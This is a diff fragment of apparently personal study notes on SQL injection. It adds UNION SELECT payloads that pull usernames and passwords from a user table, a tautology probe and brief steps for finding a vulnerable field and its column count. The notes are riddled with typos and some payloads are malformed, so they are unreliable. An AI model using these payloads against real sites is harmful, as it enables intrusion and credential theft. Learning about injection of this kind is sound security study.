@@ -240,13 +240,24 @@ ile upload
 * select tireid,name,size from session.Tires ;
 * select tireid,name,size from session.Tires UNHION SELECT name,type,cost from session.car ;
 * select tireid,name,size,4 from session.Tires UNHION SELECT name,type,cost,color from session.car ; -> using 4 as a place holder to display new option 
-
-
+* Audi' UNION SELECT username,2,passwd,jump,5 FROM session.userinfo # 
+* Audi' UNION SELECT tireid,2,size,cost,5 FROM session_schema.columns
 
 
 
 ```
+# SQL Injection on a unsanitized website
+```
+* 'Or 1=" 1 -> veridies i data base i 
+* tURN GET rEQUEST INT RAW DATA 
+* Audi UNION SELECT 1,2,3,4,5 # 
 
+Steps: 
+1) ID Vuln. Field
+2) ID # of Columns
+
+
+```
 
 
 
